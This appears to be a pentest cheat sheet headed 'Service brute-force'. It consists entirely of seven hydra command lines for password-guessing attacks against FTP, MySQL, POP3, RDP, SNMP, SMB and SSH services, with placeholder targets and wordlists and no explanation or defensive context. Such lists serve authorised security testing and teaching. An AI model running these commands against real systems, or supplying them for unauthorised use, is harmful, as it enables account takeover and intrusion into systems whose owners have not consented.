## Service brute-force

```
hydra -l root -P passwords.txt [-t 32] <IP> ftp

```

```
hydra -L usernames.txt -P pass.txt <IP> mysql

```

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V

```
```
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>

```
```
hydra -P common-snmp-community-strings.txt target.com snmp

```
```
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1

```
```
hydra -l root -P passwords.txt <IP> ssh

```
